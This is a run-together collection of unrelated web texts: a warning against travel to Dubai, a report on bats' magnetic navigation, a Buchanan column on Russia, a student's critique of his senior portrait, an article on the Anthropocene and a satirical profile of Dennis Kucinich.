If you go to Dubai , you are guilty until proven innocent under their unique little brand of sharia - lite laws .
DO NOT be fooled by their campaign of hearts and minds and their self appointed branding as some sort of open - minded oasis in the Middle East .
Diz is not alone : he is actually in the company of many other hapless victims who were singled out to make an example of .
Do not think this could not happen to you .
His story needs to get out so this does not happen to anyone else .
This is the message we need to get across : Dubai is not a safe tourist destination for Westerners .
Do your own research , and here are just a few links to get you started :
Woman hospitalized in Dubai and given painkillers , arrested at airport for it
Briton held in Dubai for painkillers in system
Canadian anti-drug agent arrested for ... drugs
15 year old tourist accused of homosexual acts after being gang raped

They may not be on most people 's list of most attractive species , but bats definitely have animal magnetism .
Researchers from the Universities of Leeds and Princeton have discovered that bats use a magnetic substance in their body called magnetite as an ' internal compass ' to help them navigate .
Dr Richard Holland from Leeds ' Faculty of Biological Sciences and Professor Martin Wikelski from Princeton University studied the directions in which different groups of Big Brown bats flew after they had been given different magnetic pulses and released 20 km north of their home roost .
Dr Holland was part of the team which , in 2006 , discovered that bats used the Earth 's magnetic field to get around , but until now , how bats were able to sense the field was still unknown .
Big Brown bats were put through a magnetic pulse 5000 times stronger than the Earth 's magnetic field , but orientated the opposite way .
( The bats were put into a coil ( 10 cm diameter by 10 cm long ) which produced a pulse of 0.4 seconds that was 0.1 tesla in strength . )
Dr Holland said : " We had three groups of bats .
One had undergone the magnetic pulse with a different orientation , and one control group had received no pulse at all .
The third group had undergone the pulse , but in the same orientation as the Earth 's magnetic field .
By including this group , we could easily see if changes in behaviour were the result of confusion caused by the pulse itself rather the impact of its orientation on the magnetite . "
The control group made their way home as normal , as did those which had undergone the pulse with the same orientation to the Earth 's magnetic field .
But of those which had been through the pulse with a different orientation , half went home but half went in the opposite direction .
" This clearly showed that it is the magnetite in their cells which give bats their direction as we were able to change how the bats used it as an internal compass , turning their north into south , " says Dr Holland .
" But as only half were affected , it 's likely there is another mechanism as well , which in some bats enabled them to override the impact of the pulse . "
Magnetite is found in the cells of many birds and mammals , including humans , but if we were once able to find our way by an internal compass , it 's a skill we appear to have lost long ago .
The researchers were able to conduct their unique experiment by use of radio transmitters on the bats which were monitored from the ground and from a plane to verify the signals were correct .
However , this kind of monitoring is limited to short distances , so the team is now in discussions with NASA and ESA about using satellites to help track smaller migratory birds and mammals .
The satellites currently used by scientists can only track larger sea birds over 300g , although 60 per cent of mammals and 80 per cent of birds are below this size .
The technology exists to track this size of target , but no satellite has yet been launched .
Dr Holland believes tracking this size of bird or mammal is of key importance .
" Birds and mammals carry and spread diseases , such as rabies or bird flu , and plotting their migration and movement can help us predict this spread .
Large movements of birds can act as pests in themselves , but other species are scarce and need conservation support .
We were only able to make our discovery through studying bats in the wild .
But for many creatures , satellite tracking is the only way to study them in their natural habitat to help tackle these issues . "

Make America Think Again ! - Share Pat's Columns ...
by Patrick J. Buchanan
Our next president will likely face a Russia led by Prime Minister Vladimir Putin , determined to stand up to a West Russians believe played them for fools when they sought to be friends .
Americans who think Putin has never been anything but a KGB thug will reject accusations of any U.S. role in causing the ruination of relations between us .
Yet the hubris of Bill Clinton and George Bush I , and the Russophobia of those they brought with them into power , has been a primary cause of the ruptured relationship .
And the folly of what they did is evident today , as Putin ’s party , United Russia , rolls to triumph on a torrent of abuse and invective against the West .
Entering the campaign ’s final week , Putin , addressing a rally of 5,000 , ripped the Other Russia coalition led by chess champion Garry Kasparov as poodles of the United States , “ who sponge off foreign embassies … and who count on the support of foreign resources and governments , and not of their own people . ”
“ Those who oppose us , ” roared Putin , “ do n’t want our plans to be completed .
They have completely different tasks and a completely different view of Russia .
They need a weak , sick state , a disoriented , divided society , so that behind its back they can get up to their dirty deeds and profit at your and my expense . ”
Putin is referring to the time of the “ oligarchs ” of the Yeltsin era , who looted Russia when its state assets were sold off at fire - sale prices .
Putin is also accusing his opponents of attempting to use the Western - devised tactics of mass street protests to bring down his government .
“ Now that they have learned some things from Western specialists and tried them in the neighboring republics , they are going to try them on our streets . ”
Putin is talking here about the “ color - coded ” revolutions that the U.S. and NATO embassies , the National Endowment for Democracy , and allied foundations and front groups engineered in Ukraine and Georgia .
Governments tilting toward Moscow were dumped over and pro-Western regimes installed – to bid for membership in NATO and the European Union .
Blowback is a term broadly used in espionage to describe the unintended consequences of covert operations .
The revolution that brought the ayatollah to power is said to be blowback for the U.S. - engineered coup to overthrow Mossadegh in 1953 and install the shah .
The nationalism and anti-Americanism rife in Putin ’s Russia is blowback for our contemptuous disregard of Russian sensibilities and our arrogant intrusions into Russia ’s space .
How did we lose a Russia that Ronald Reagan and Bush I had virtually converted into an ally ?
We pushed NATO into Moscow ’s face , bringing six ex-Warsaw Pact nations and three ex-Soviet republics – Lithuania , Latvia and Estonia – into our Cold War alliance and plotted to bring in Ukraine and Georgia .
We financed a pipeline from Baku through Georgia to the Black Sea to cut Russia out of the Caspian oil trade .
After getting Moscow ’s permission to use old Soviet bases in Central Asia to invade Afghanistan , we set about making the bases permanent .
We pulled out of the Anti-Ballistic Missile treaty over Moscow ’s objection , then announced plans to plant ABM radars in the Czech Republic and anti-missile missiles in Poland .
Putin has now responded in kind , and who can blame him ?
As we tried to cut him out of the Azerbaijan oil with a Black Sea pipeline , he is slashing subsidies on Ukraine ’s oil and colluding with Germany on a Baltic Sea pipeline to cut Poland out of the oil trade with Western Europe .
As we moved our alliance and bases into his front and back yard , he has entered a quasi-alliance with China and four nations of Central Asia to expel U.S. military power from the region .
As we abandoned the ABM Treaty , the Duma , in November , voted 418 to 0 to suspend participation in the Conventional Forces in Europe Treaty , which restricts the size of the Russian army west of the Urals .
If we recognize Kosovo as independent , at the expense of Serbia , Putin is now threatening to recognize South Ossetia and Abkhazia , the breakaway republics of Georgia and Transneistria , claimed by Moldova .
Where we backed the Orange Revolution in Ukraine and the Rose Revolution in Georgia , Russia backs its favorites in Kiev and supports street protests in Tbilisi against the pro-American regime of Mikhail Saakashvili , whom the United States now seems powerless to help .
It was not NATO that liberated Eastern Europe .
Moscow did – by pulling out the Red Army after half a century .
Why , then , did we think moving NATO into Eastern Europe was a surer guarantee of their continued independence than the goodwill of Russia ?
Many among our foreign policy elite now talk of a Second Cold War .
John McCain wants Russia kicked out of the G - 8 .
But do we not have enough enemies already that we should add the largest nation on earth ?
Rip - off Photography
3-09 -07 Introduction
I am currently enrolled as a senior in high school , and like all parents , my mother decided to fork over ridiculous amounts of cash to have senior portraits taken of me in addition to the ones that end up in the yearbook .
In the time between when I got my pictures taken and we got them back , I went out and purchased my own Canon Digital Rebel Xti and started a little hobby of photography myself .
I borrowed a few books from the library about portrait composure .
To make a long story short , I was less than satisfied with the pictures I got back .
My purpose in writing this article is to inform the public about what makes a good photograph .
Some people ( like my mother ) will look at the picture below and think it 's great and happily fork over about $ 400 for it .
They say ignorance is bliss , which it is , but in this case , it 's just costly .
As you read this , you might be thinking that this photograph is spectacular , but I 'm here to tell you that there are several egregious problems with it that a decent photographer would know to fix , resulting in a much better photograph .
This particular photographer preyed on the ignorant .
For example , when showing proofs to customers , he used an LCD projector in a dark room .
This resulted in a huge picture on the wall that customers could " Oooh " and " Ahhh " at , but it was really pointless .
LCD projectors are used to show things to large groups .
The biggest group he was dealing with was maybe five or six people , so a large image was pointless .
LCD projectors have very bad color accuracy , even in dark rooms , and they sport much lower resolutions than conventional LCD monitors .
A better photographer would have sat down with the customer in front of a large , high quality and color accurate display and shown the selection to his clients .
This guy was just trying to get customers excited by exposing them to an extravagant environment that is foreign to them .
This was made obvious when he claimed that he was using a $ 12,000 lens .
At the time , knowing almost nothing about cameras , I believed him .
I now know that $ 12,000 is a ridiculous amount of money to spend on a lens .
Even Canon 's best line of lenses , the " L " series , still tops out at about $ 8000 , and that 's for their telephoto zoom lenses .
So , for the rest of the article , I will critique this picture of myself and give you , the reader , a little insight on what makes a good photo .
I know that some of you will argue that you like your photos a certain way and you do n't care what I have to say .
If you are one of those people , please save both of us time and stop reading right here .
I know that photographers are free to express themselves however they like , but from a professional business - client standpoint , there are a few general rules of thumb .
The Portrait
( click to enlarge ) Composition
The purpose of a portrait is not just to make people look good .
A photographer also wants to capture that person 's personality in the picture .
In ten or fifteen years , the client wants to look at that picture of himself and recall exactly what he felt like at that time in his life .
Bringing natural expressions out of people is difficult for photographers .
Often , people have to hold their bodies in unnatural positions to have a natural looking photograph .
This is where an excellent rapport between the photographer and subject comes into play .
The photographer really has to get to know the subject and find out what kind of person they are .
Looking at this picture , you would probably would n't assume that I am an Eagle scout who enjoys camping in the outdoors .
I look like a twelve year old boy .
This is a picture of me in body , but not in spirit .
This is because during my shoot , the rapport between myself and my photographer was virtually non-existent .
He was continuously snobby , and seemed very rushed .
He obviously could n't waste the time to get to know me and rather simply applied his normal composition formula for all of his clients to produce this picture .
In this picture , My head is cocked at a ridiculous angle .
When I look at this picture , I feel like I was trying to hold an egg under my chin .
This is made obvious by the rather unpleasant wrinkle in the skin around my neck .
He made me do this so that I could look up at the camera .
I suppose he was trying to give me the look of childhood innocence .
Unfortunately , I am eighteen years old ; a borderline adult .
Perhaps he could have lowered the camera some , or cocked my chin up higher to make myself more at the same level as the viewer of the picture .
Also , when coupled with the lighting , the lines of my face are indistinguishable Lighting I have no head in this picture , I am simply a thumb with eyes and a mouth .
Proper lighting should create depth in the image and make it easier to see a three dimensional object or person on a two dimensional surface .
What this photographer should have done was place some light to my side to cast a shadow across my face .
Some photographers even develop ratios of the difference in lighting from one side of the face to the other .
In this picture , most of the light is cast from behind the camera and softened to extremes , this generates a very flat image where it's hard to easily discern where my nose or chin stops .
Even just a small shadow wrapped around the left side of my face ( left from the viewer 's standpoint ) would have separated my chin from my neck .
Also , some kind of light crossing my face would have many my nose more easily visible and the curves of my face better defined .
A little lighting on the hair would have brought out its color too .
Most photographers use a light that sits behind the subject to hi-light the hair .
The light is reflected off the hair and towards the camera , creating a bright fringe around the top which brings out the color and texture in the hair .
Photoshop Every photographer uses Photoshop .
It has become a necessity for professionals that want their pictures to be virtually flawless .
Unfortunately , this photographer found some flaws in me that I did n't even know were flaws .
For instance , eye color :
My eyes are not blue !
When I first saw this , I almost cried .
The one consistent compliment that I get from members of the opposite sex is not that I have good looking hair , or a fine body , but it's that I have pretty eyes .
This photographer did n't seem to agree .
He turned my beautiful green eyes to the most absurdly unnatural blue .
Other changes include removing a rather charismatic mole on my forehead and softening my face to insane levels .
I guess I had a little bit of a stubble when I was being photographed , and rather than trying to remove this stubble , or leave it in , this photographer applied the standard treatment : intense softening .
The result is a strange grey smear that goes all the way around my chin , from ear to ear .
Photoshop should only be used to fix problems , not to alter people 's faces entirely .
I feel like , after going to this extreme , this photographer would have been better off starting from scratch and just drawing a picture of me , or rather , a picture of what he thinks I should look like .
I 'm still rather surprised that he did n't use his magical photoshop abilities to remove the horrible wrinkle I have in my shoulder .
My Portrait
( click to enlarge )
This is a picture that I took of myself recently .
Before you even think it , I 'm not claiming that this is a professional quality picture .
I took this picture with my new camera using a pretty decent 85 mm prime lens .
I had no studio lighting , I can't afford photoshop , and I took this picture of myself .
I had to set the shot , focus on where I thought I would be standing , hit the timer , run in front of the camera , guess where I should place my face to be entirely in the frame and in focus , and smile before the ten second timer ran out .
There are a few things I like about this picture though .
Firstly , I was much more comfortable when taking this picture , so I do n't look so awkward .
My face describes my personality .
I have a sort of half - assed semi-amused smile which describes my cynical nature .
My head 's angle is a little weird , but I 'm going to write this off to the fact that I did n't have a mirror at the time .
Despite the fact that I did n't have any studio lighting , this picture actually turned out alright .
The window behind me provided a soft hi-light to my hair as well as some light to wrap around my neck .
Also , the lighting is directed from the right side to the left , so there is a definite shadow to the left of my nose and to the left of my chin .
I did n't touch this photograph at all after I took it .
Had I , I probably just would have fixed the blemish to the top right of the eye on the right ( my left eye ) .
That 's about all I think is necessary .
Conclusion
After all of this , my mom still paid this guy over $ 700 for all the portraits we got .
She loves them , so I guess that 's ok ; they are worth $ 700 to her .
This still does n't change the fact that this photographer is getting a ridiculous amount of money for a minimalist effort and little artistic insight .
With enough practice and set up , I am confident that I could match and surpass the quality of his photos , and I am only an amateur .
I just hope that after reading this , you know to expect more from a professional photographer and not settle for anything less than the best for the price that you are paying .
Update
12-29-07
Wow , I posted this article to Reddit at 4 am this morning and it's exploded over the web .
It even became the topic of a thread over at dpchallenge.com .
Some people even offered their own photoshopped versions of my picture :
This one was edited by Andres over at dpchallenge .
This one was sent to me via e-mail by Tom Scott .
This one was posted by Strikeslip on the dpchallenge thread .
He really managed to bring out the green in my eyes .
Ast3r3 x sent me this one .
He says that " Ideally , you wo n't be able to notice a difference unless you actually look at both , the real point of retouching is so that you just think that it is a fabulous picture of yourself . "
I agree
Jeff just got photoshop for Christmas ( lucky ) and he gave my portrait a go .
Les Gainous over at DPChallenge tried a " grunge " look .
Looks great !
Here 's Hans ' rendition !
Here 's another one from Arif .
Man , you guys are still sending them in .

Writing in the house journal of the Geological Society of America , GSA Today , Britain 's leading stratigraphers ( experts in marking geological time ) say it is already possible to identify a host of geological indicators that will be recognisable millions of years into the future as marking the start of a new epoch - the Anthropocene .
Geologists have long divided the Earth 's history into distinct epochs , periods and eras - with names as familiar as the Triassic or the Carboniferous .
It 's extraordinary how a single species could have such an effect on the whole planet
Dr Jan Zalasiewicz , Leicester University
Sometimes the boundaries mark extreme violence .
The end of the Cretaceous Period 65 million years ago , and with it the dinosaurs , and the beginning of the Tertiary ( the ' third ' age of geology ) came with the impact of a huge asteroid .
A force of nature
Sediments around the world from that time carry a tell - tale layer tinged with iridium , a metal more common in space than it is on the Earth 's surface .
There can also be soot - the result of global wildfires that followed the catastrophe .
The fossil record either side of the boundary is quite distinct .
Plate tectonics , the slow movement of the continents , has also created dramatic changes , as huge mountain ranges are built or ocean basins are cut off or opened up .
New periods are created as the Earth system passes through a new threshold .
But the new epoch has not been shaped by these relentless forces of the deep Earth or the violence of extraterrestrial impacts .
Instead , say the scientists , it has been moulded by a single species - man - so that it should be called the Anthropocene , the time of man .
" It 's extraordinary how a single species could have such an effect on the whole planet , " says Leicester University 's Dr Jan Zalasiewicz , who heads the Stratigraphic Commission of the Geological Society , the team that penned the new report .
" Human activity exceeds natural processes in many ways .
" For example , humans emit more CO2 than do volcanoes by quite a long way ; humans move more material across the surface of the Earth than do rivers , landslides and floods . "
' Blink of an eye '
Bringing an academic rigour to a concept that has been circulating since 2000 when it was first proposed by Nobel Laureate and ozone expert Paul Crutzen , the researchers ask whether there is a worldwide signature that could be recognised long into the future as marking the start of this new epoch .
" What we 're asking is what the record in the rocks of the human species is going to look like , " says co-author Dr Andy Gale , from the University of Portsmouth .
" It 's fascinating thinking what record future geologists will see of human activity .
" For one thing , there will be a hell of a lot of concrete .
And the disruption to the Earth 's surface , stripped for farming and mining , causing a vast increase in the amount of mud and sand sediment going into the oceans . "
" There are other signals , " adds Dr Zalasiewicz .
" The oceans are acidifying right now .
If they acidify much further , coral reefs will stop growing .
And so reef limestone will stop being produced .
And that will be another very obvious sign in future strata . "
Huge changes will occur in the fossil record .
Not just because of the mass extinction we are causing , but because of the huge number of human remains that will become melded into future rock layers .
Many of these geological changes stretch out over generations of human history - frustrating attempts to pinpoint the kind of " golden spike " the geologists would like .
But even a thousand human generations would be but the blink of an eye in the deep geological record .
" In many rock successions a thousand years can be a millimetre or two , " explains Andy Gale .
" So geologically speaking , this series of events is proceeding very fast .
I do n't think the changes are going to be subtle at all - these signs would be very conspicuous "
Future geologists
Epochs come lowest in the order of geological timescale .
By current definitions , we 're in the Holocene epoch ( " wholly recent " ) that started at the end of the last ice age .
The larger timescales - the periods and eras - are driven by more powerful forces .
The question the geologists are asking is just how big a change we are wreaking on the planet .
You could say the Anthropocene started 200 years ago with the industrial revolution , or 5,000 years ago when sediments started accumulating the first signals of metalwork .
But equally interesting is when it will end .
" If humans stop , it wo n't be that the effects stop .
The effects will ramify through the system for a considerable time .
If the impacts are big enough , you make whole groups of creatures extinct .
And then the future life comes from the survivors , so life changes ?
and the Earth changes . "
This happened when the dinosaurs were wiped out , heralding a new period of Earth history .
The comparison is irresistible to the report 's authors , including Dr Mark Williams of Leicester University : " We are clearly changing the planet at an exponential rate .
And it 's possible we could be starting a new geological period and this could be the Anthropocene Period . "
Unfortunately to find out , we may need to wait tens if not hundreds of millions of years .
Because He Was Right The Long Campaign of Dennis Kucinich
Justin DeGarmo
Is America ready for its first vegan president ?
Please .
Maybe its first woman president .
Perhaps a black president .
Possibly even a Latino president .
And , as Chris Rock pointed out , we 've got a retarded president right now .
But a guy who faults a cheeseburger on two counts , the meat and the cheese ?
A vegan president ?
No fucking way .
Do n't be retarded .
And most certainly not this particular vegan , Ohio congressman Dennis Kucinich .
This is a candidate who announces , on national television , that he would refuse to shoot a Hellfire missile at Osama bin Laden if given the opportunity ; a guy who prattles on about the interconnectedness of humanity and his plans for creating a cabinet - level Department of Peace ; a man who brags about the wonderfully low blood pressure his animal - cruelty - free diet has brought him ( memo to the Kucinich campaign : Americans like their leaders carnivorous and on the verge of cardiac arrest , thank you very much — see , for example , our last two presidents : Bill Clinton and Dick Cheney ) .
Sure , it might be unfair , a cosmic and karmic injustice even , that Kucinich , who was more right about the Iraq war than most Democrats ( and , for the record , more right than one of the meat - eating authors of this vegan - bashing profile ) , now has less chance of being president than U.S. troops have of stumbling across those alleged Iraqi WMDs .
But that 's the way we roll here in America .
This is a country in which 41 percent of people still believe that Saddam Hussein was responsible for 9/11 .
This is a country in which some people still believe that there is some sort of dignified way out of Iraq — " home with honor " is how the pollsters and strategists describe the widespread sentiment — and , delusional or not , these Americans do n't see much " honor " in our troops marching out of the Middle East on the orders of a five - foot - seven , turn - the - other - cheek waif who flashes peace signs without irony and would n't eat a steak with the boys once they 're back home .
None of this stops Kucinich , however .
Long odds never have .
He soldiers on ( sorry , too militaristic ? ) , making his second consecutive run at the White House , and no more likely to win this time around than in 2004 — although , as he points out at every opportunity , times have changed considerably since his last go at the presidency , when he received just 1 percent of the delegate votes at the 2004 Democratic National Convention in Boston .
" The American people are ready for peace and they know I was right , " Kucinich said during an interview in New Hampshire in early June , after a CNN debate that gave him relatively little airtime and saw him positioned , on the stage , at the furthest left fringe of the seven other Democratic presidential hopefuls .
Because he 's a peace candidate who nevertheless loves a political fight , Kucinich followed up his comments with a jab at the other Democratic contenders who supported the war .
" Others , " he said , in reference to Hillary Clinton and John Edwards , " were wrong . "
Yeah , Hillary and John were wrong , Dennis , just like most of the American people — you know , the American people , those flag - waving meat eaters you 're trying to talk into voting for you .
We 're guessing they do n't like being reminded that they were wrong any more than your opponents do .
Kucinich , 61 , has long been an " everyone else is wrong " type of guy , the type of politician who strikes a certain type of liberal as totally righteous for his unwillingness to compromise .
But he strikes a lot of other liberals — a clear majority , as evidenced by his vote totals in liberal - dominated Democratic primaries — as obnoxious and inflexible to an agenda - hobbling degree .
It 's hard to find anyone , however , who does n't see him as exceptionally driven .
Kucinich was born in Cleveland , Ohio , in 1946 , to a working - class family that saw some hard times ; on occasion , his family was forced to sleep in cars .
He made his first attempt at public office at the age of 20 , filing a petition to run for a spot on the Cleveland City Council despite the fact that he could n't legally vote yet .
The year was 1967 , and at the time he was still a sophomore at Cleveland State University , working toward a degree in communications .
Kucinich did n't succeed in that first run for office , but just over two years later he did , joining the city council at the age of 23 .
If that span of three years shows the mark of an ambitious and unrelenting personality , it was only the beginning :
Three years later , Kucinich ran for Congress as a Democrat .
He lost , but within two years the man who had defeated him , Republican William E. Minshall , Jr. , retired .
Kucinich then ran again for the seat .
When he did n't get the Democratic nomination for his second attempt at Minshall 's seat , Kucinich ran as an independent .
He lost .
Again .
A few years passed , and then , readjusting his sights , Kucinich ran for mayor of Cleveland .
In that race , being the stubbornly populist son of a Cleveland truck driver played to his advantage .
Kucinich won , becoming , at age 31 , the youngest big-city mayor in American history up to that time , and earning himself national attention as the " Boy Mayor of Cleveland . "
He proceeded to make more history , not all of it the kind an ambitious young politician would hope for .
Most famously , in order to keep electricity rates low in his city , Kucinich refused to sell off Cleveland 's municipal power company , Muni Light , to a larger power company that was using all of its political and economic leverage to try to force a sale .
Although Kucinich succeeded in his crusade against the larger power company , his victory came at a very high price .
To hang on to Muni Light , Cleveland was forced to default on some of its bonds .
Because of this , under Kucinich 's tenure as mayor , Cleveland became the first American city to go into financial default since the Great Depression .
( And this on top of some other notorious Kucinich accomplishments : his banning of nuns from City Hall and his sacking of a well - regarded police chief via press conference on Good Friday — both of which probably contributed to his having to wear a bulletproof vest to throw out the first pitch at an Indians game in 1978 . )
It will not surprise , then , that it was during this time that Kucinich became tagged with his " Dennis the Menace " label — a moniker that , consciously or not , Kucinich has succeeded in keeping in circulation for nearly 30 years .
Kucinich himself has described his rocky mayoralty in Cleveland as " absolute chaos , " and others have tended to agree .
Due in large part to his temperament while in office , he placed seventh on an authoritative list of the 10 worst big-city mayors since 1820 .
While mayor , Kucinich did manage to survive a recall attempt ( by 200 votes ) , but when reelection time came around in 1979 , he was solidly defeated .
He slunk off to promote a French book written about his tenure , L'Enfant Terrible de Cleveland , and told people he was working on a novelized memoir about his experience .
Then came his 15 years of wandering in the political wilderness — his time as a college lecturer ; his stint as a TV reporter ; his flight to Los Angeles ; his trouble paying his mortgage ; his friendship with the actress Shirley MacLaine and with her " spiritual facilitator , " Chris Griscom , whose Light Institute , located near Santa Fe , New Mexico , listed Kucinich as a client in the 1990s , according to a Washingtonian profile from the time .
That Washingtonian profile quoted the institute 's marketing director as saying the Light Institute helps people " expand their consciousness " and " get in touch with their inner child , " along with helping them expand the " multidimensional and multi- incarnational " aspects of their identities .
In the Washingtonian profile , Kucinich laughed off a question about whether he had come to believe in past lives , answering the query with a joke about the many public reincarnations of some politicians .
What exactly Kucinich believes about reincarnation has been a source of speculation ever since his Light Institute days , but in the end , it probably does n't matter much ( except to late - night comics ) whether , during his sojourn away from the campaign trail , Kucinich was a student of actual man - dies - and - comes - back - to - life - as - an - insect reincarnation , or just a student of the more run -of - the - mill into - the - wilderness - and - back political reincarnation .
Something clearly worked .
In 1994 , with big fundraising help from MacLaine , Kucinich began his second political life , winning a seat in the Ohio State Senate .
His stock was on the rise as the passage of time vindicated him :
It turned out that Kucinich 's financial brinksmanship in the Muni Light affair had saved Cleveland citizens millions of dollars .
In his run for state senate , his campaign posters featured a light bulb and the phrase , " Because he was right . "
When he ran for Congress , in 1996 , his posters said , " Light up Congress . "
And in 1998 , in a final bit of political absolution , Kucinich was honored by the Cleveland City Council for " having the courage and foresight " to hang on to Muni Light despite paying the ultimate political price at the time .
When Kucinich talks today as if he is convinced that he will be proven right eventually on every issue , and campaigns in New Hampshire and other battleground states as if " Because he was right : Iraq edition " will be a winning slogan at the presidential level , this experience can't be far from his mind .
Whether he 's just reliving glory days or is actually on to something , there 's no doubt that Kucinich 's win in 1996 was a bona fide moment of glory :
His victory in that congressional race was a high point in his march back into public life , and also something of an upset for Democrats at the national level .
The seat representing Ohio's 10th District , which includes Cleveland , had been held by a Republican for two terms until Kucinich took it back .
He 's now held it through five elections .
That does n't mean , however , that he 's become more flexible or politically pragmatic in order to make it through six terms in the House .
" Kucinich has lots of energy , he 's got a ton of ideas , and he 's a little impatient with his colleagues , " said Congressman Jim McDermott , who represents Seattle in the House and , like Kucinich , is considered one of the body 's most liberal members .
The Kucinich brand of impatience , McDermott says , is that of someone who knows he 's right and has never learned to tolerate the slow pace of political change .
" He 's a guy to take a risk , " McDermott told us .
" I take some risks myself , so I have respect for people who do n't sit and wait for the pack to tell them to do something .
But I think his timeline is a little short for this process .
I do n't disagree with an awful lot of what he 's up to , but I think there are ways you might be more successful in getting it done , that 's all .
The suffering of fools is a talent , and not everybody suffers fools gladly .
He believes they ought to move more quickly because this is only going to get worse . "
McDermott 's ambivalence sums up how a lot of people feel about Kucinich .
Right on many issues , but his rhetoric , his personal life , and his way of getting from here to there turns people off .
In polls , that 's translating into disappointing finishes ; a September poll in New Hampshire found Kucinich getting just 3 percent of the Democratic primary vote .
And in terms of press coverage , it 's keeping Kucinich in permanent afterthought status .
In the spin room immediately after the New Hampshire debate , the Kucinich station , like that of fellow " fringe candidate " Mike Gravel , was completely ignored as reporters and cameramen swarmed around spokespeople for the front - runners : Hillary Clinton , John Edwards , and Barack Obama .
It took the personal intervention of both Kucinich and his bombshell 29 - year - old wife ( his third marriage ) to draw a crowd , and even then it seemed that most of the attention was due to the irresistibly funny photo - op the couple offers .
Elizabeth Kucinich , the tongue - stud - wearing daughter of a lefty British family , stands six feet tall without heels and looks like a model .
In the political realm , where the perception of the superficial can be everything , the sight of such a woman with her arm around the nerdy Kucinich ( who is more than twice her age ) tends to invite a lot of thoughts about the candidate himself , some of them flattering , but many of them unhelpful to Kucinich 's presidential ambitions — thoughts about the insecurities of short men , for example , or the historical tendency of American voters to prefer the tallest guy in the presidential candidate lineup .
But the sight of the couple also invites a lot of double takes , the way seeing Grace Jones with her arm around Al Gore would , and this is something the Kucinich campaign clearly knows .
( At a later debate in South Carolina , when Senator Joseph Biden was asked to tell the audience what he likes best about Kucinich , he looked at Kucinich and replied , with a smirk , " Your wife . " )
It 's also something the Kucinich campaign has learned to use to its advantage .
At the New Hampshire debate , when Elizabeth entered the spin room with Kucinich , the problem of his station being ignored was immediately solved .
Elizabeth was sporting a jeweled " PEACE " brooch pinned onto her fitted black jacket , showing off perfectly manicured toes that could be seen through the straps of her sleek , black high heels and , in a nod to her potential first - lady status , wearing a string of pearls .
She said nothing , and did n't have to , as the cameras snapped away and the reporters pressed closer .
When Kucinich defended his eyebrow - raising debate statement that he would n't give the order to " take out " Osama bin Laden with a Hellfire missile ( " A peaceful approach is that you do n't use assassination , " Kucinich told a reporter ) , Elizabeth nodded , wrapped one of her long arms around his waist , and squeezed him tighter to her side .
When he posed for pictures with her , he could n't wipe the huge , shit - eating grin off his face .
Their love story is quintessential Kucinich .
He met her when she came to his office on Capitol Hill two years ago to discuss monetary policy as part of her then - new job with the American Monetary Institute — a job she 'd taken after a stint at the House of Lords in London , some time working in one of Mother Teresa 's homes for poor children in India , and studies in religion and international conflict resolution .
At the time of their meeting , Elizabeth 's last name was Harper , and the signature line on her e-mails included a quotation from the film Kama Sutra : " Knowing love , I shall allow all things to come and go , to be as supple as the wind and take everything that comes with great courage .
My heart is as open as the sky . "
Kucinich , who had been single for 20 years , and who , in 2003 , had told a political forum in New Hampshire that his perfect soul mate would be " fearless in her desire for peace in the world and for universal , single - payer health care , " found himself awestruck .
After the meeting , he phoned a friend and exclaimed that he'd met his future wife .
Elizabeth also had a love - at - first - sight moment .
She later told an interviewer for the Tampa Tribune that upon meeting Kucinich , " I felt such hope for America .
It made my heart sing . "
Shortly after their heart - stopping monetary - policy encounter , Elizabeth sent Kucinich a business e-mail ( including her Kama Sutra signature line ) , and the two began an exchange that led them to discover they would both be in New Mexico at the same time in the near future .
They had dinner , spent a night together at Shirley MacLaine 's New Mexico home , and a few days later decided to get married .
On the campaign trail , Elizabeth has been asked frequently about the height and age differences between herself and her husband , but she prefers to discuss their perfect spiritual union .
As she told the London Sunday Times in May : " Can you imagine what it would be like to have real love in the White House and a true union between the masculine and the feminine ? "
Uh ... sure , but only if we do n't have to imagine the physical contortions involved in that height differential — or the White House porters having to lift Kucinich up for a goodnight kiss .
Still , they do seem like a perfect match .
In terms of loopy statements related to Kucinich , hers about their " true union between the masculine and the feminine " now rivals Kucinich 's own famous statement about the universe's " starlit magic " at an international peace conference in Croatia in 2002 .
" Spirit merges with matter to sanctify the universe , " he explained to the conference crowd .
" Matter transcends to return to spirit .
The interchangeability of matter and spirit means the starlit magic of the outermost life of our universe becomes the soul - light magic of the innermost life of our self . "
Right .
Congratulations , Mr. and Mrs. Kucinich .
But we 're not convinced that your soul - light magic is going to move voters in Iowa — and neither are those who follow every last detail of these races , even down to the appeal of the candidates ' wives .
Not long ago , the New York Times Sunday Styles section devoted an entire article to the question of whether Republican Fred Thompson 's beautiful , much younger wife would be viewed as a " trophy wife , " and therefore become a political liability if he entered the presidential race .
That this question would even be explored in the Times was a testament to the perception that Thompson was an otherwise formidable candidate .
In 2004 , back when John Kerry was still seen as a somewhat formidable presidential candidate , his wife , Teresa Heinz Kerry , merited the same type of attention for her unfiltered comments and potentially off - putting sophistication .
But Elizabeth Kucinich is n't getting this kind of treatment .
Hardly anyone is ruminating on whether she 's viable as a general - election campaign spouse , because hardly anyone seriously believes that she and her husband will make it to the general election .
Instead , Elizabeth Kucinich is treated mainly as someone who catches the eye of people like Biden , and who doubles the comedic fodder that her husband 's campaign appearances normally provide — as a joke amplifier , in other words , rather than a message amplifier .
But hey , maybe in 15 years ' time , the Kuciniches will be proven correct .
Maybe we 'll all wake up one day and realize that matter does , in fact , transcend into spirit , and think to ourselves :
You know , a true union between the masculine and the feminine is just what the White House needs .
In reality , we are far likelier to be saying that about the third and fourth terms of Bill and Hillary than about the first term of Dennis and Elizabeth .
But still , you never know .
Dennis Kucinich could be right again .
As he constantly reminds us : It 's happened before .
There is one issue that Dennis Kucinich definitely has n't been right on , at least as far as Democratic primary voters are concerned : abortion .
He was raised Catholic , and apparently in his adulthood , even as his mind opened to New - Age notions and supposedly higher planes of awareness , he remained convinced that a woman 's right to choose needed to be severely restricted .
In Congress , Kucinich was well aware that this stance did n't play well with his liberal base .
He did n't seem to care , but he had enough political sense to try to keep his views quiet .
In 2002 , the Nation noted that one thing Kucinich was n't mentioning on his website was his record on reproductive rights .
Without much notice , he'd become a darling of the National Right to Life Committee , earning a zero percent favorable rating from NARAL Pro-Choice America , and amassing a " Henry Hyde–like " anti-choice voting record .
You would n't have known it back then from his online presence ; even now , Kucinich buries reproductive rights at the bottom of the issues page on his campaign website and glosses over his past anti-choice positions this way : " Most Americans , including myself , are uncomfortable with abortions and feel there are too many of them . "
But the record is clear :
As a congressman , Kucinich has voted to prevent anyone but a parent from taking a teenage girl across state lines for an abortion .
